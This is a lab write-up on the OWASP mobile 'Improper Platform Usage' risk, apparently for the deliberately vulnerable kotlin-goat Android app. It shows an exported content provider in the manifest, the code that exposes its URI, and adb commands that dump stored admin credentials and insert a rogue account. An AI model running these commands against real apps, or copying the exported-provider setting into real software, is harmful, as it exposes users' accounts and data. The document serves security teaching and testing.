M1: Improper Platform Usage
===========================
From the [Android documentation] [1]: "Content providers are one of the primary building blocks of Android applications, providing content to applications". Content providers are mostly used to share data between Android applications. Such as Activities, Services or Receivers, Content providers can have weak permissions or can be exported for all the apps on the device. Such misconfiguration can lead the Android app to leak the data used by the Content provider.

When the Content provider is exported, all the apps can query the Content provider to retrieve or modify the data. On the kotlin-goat app, we can identifiy that a Content provider is defined with the name ".AccountProvider" and the exported tag is set to true. Here is an extract of the AndroidManifest file:
```
<provider
            android:name=".AccountProvider"
            android:authorities="com.cx.vulnerablekotlinapp.accounts"
            android:enabled="true"
            android:exported="true" />
```

Looking at the code on the AccountProvider.kt class, we can retrieve the Content URI:
```
companion object {
        private val AUTHORITY = "com.cx.vulnerablekotlinapp.accounts"
        private val ACCOUNTS_TABLE = "Accounts"
        val CONTENT_URI : Uri = Uri.parse("content://" + AUTHORITY + "/" +
                ACCOUNTS_TABLE)
        private val DATABASE_NAME = "data"
    }
```

Then, using the adb tool, we can query this provider and even insert data. Here is simple example allowing to query the provider in order to retrieve the accounts stored:
```
$ adb shell content query --uri content://com.cx.vulnerablekotlinapp.accounts/Accounts
Row: 0 id=1, username=admin, password=admin

```
We can obtain the admin's credentials in this case.


Here is another example allowing to add a new account into the kotlin-goat app:
```
$ adb shell content insert --uri content://com.cx.vulnerablekotlinapp.accounts/Accounts  --bind username:s:kotlin --bind password:s:goat
$ adb shell content query --uri content://com.cx.vulnerablekotlinapp.accounts/Accounts
Row: 0 id=1, username=admin, password=admin
Row: 1 id=2, username=kotlin, password=goat

```

More information about how to test improper platform usage can be found on the OWASP Mobile Testing Guide and especially on the [Testing Platorm Interaction] [2] section.

## Resources

### Tools

* adb

### Readings

* [Android documentation][1]
* [Testing Platform Interaction][2]

[1]: https://developer.android.com/reference/android/content/ContentProvider
[2]: https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05h-Testing-Platform-Interaction.md